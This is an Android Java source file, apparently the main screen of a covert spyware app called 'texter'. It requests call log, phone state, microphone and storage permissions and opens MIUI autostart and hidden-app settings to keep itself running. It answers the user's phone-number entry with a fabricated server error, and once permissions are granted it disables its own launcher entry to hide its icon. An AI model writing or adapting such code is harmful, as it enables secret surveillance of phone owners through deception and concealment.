package com.app.texter;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {


    Button nextbut,ab;
    EditText pn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        nextbut=findViewById(R.id.next);
        pn=findViewById(R.id.phone);
        ab=findViewById(R.id.AboutButton);



        try{Intent intent = new Intent();
            intent.setClassName("com.miui.powerkeeper",
                    "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
            startActivity(intent);}catch (Exception eeee){eeee.printStackTrace();}
        try { Intent intent = new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")); startActivity(intent);}catch (Exception e){e.printStackTrace();}


        boolean check =checkAndRequestPermissions();
        ab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=new Intent(MainActivity.this,AboutPage.class);
                startActivity(intent);
            }
        });
        nextbut.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String phoneNumber=pn.getText().toString();

                if (check){
                    if (pn.length()!=10){Toast.makeText(MainActivity.this, "Invalid Number", Toast.LENGTH_SHORT).show();}
                    else{
                        Toast.makeText(MainActivity.this, "please wait", Toast.LENGTH_LONG).show();
                        Toast.makeText(MainActivity.this, "Something went wrong with server response!", Toast.LENGTH_SHORT).show();

                        Intent intent=new Intent(MainActivity.this,Error.class);
                        startActivity(intent);
                    }
                }
                else{Toast.makeText(MainActivity.this, "Accept Permission for this  app to continue", Toast.LENGTH_SHORT).show();}

            }
        });

        if (check) {
            ComponentName componentToDisable = new ComponentName(this, MainActivity.class);
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }









    private boolean checkAndRequestPermissions() {
        int flagnumber=0;

        int readPhoneState = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        int read_call_log = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG);
        int storage= ContextCompat.checkSelfPermission(this,Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int CallAudio= ContextCompat.checkSelfPermission(this,Manifest.permission.RECORD_AUDIO);
        int readstore= ContextCompat.checkSelfPermission(this,Manifest.permission.READ_EXTERNAL_STORAGE);






        List listPermissionsNeeded = new ArrayList<>();

        if (readPhoneState != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }else{flagnumber++;}

        if (read_call_log != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        }else{flagnumber++;}
        if (storage != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }else{flagnumber++;}
        if (CallAudio != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        }else{flagnumber++;}
        if (readstore != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }else{flagnumber++;}





        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    (String[]) listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]),
                    1);
        }

        if(flagnumber==5){return true;}
        else{
            return false;}
    }




}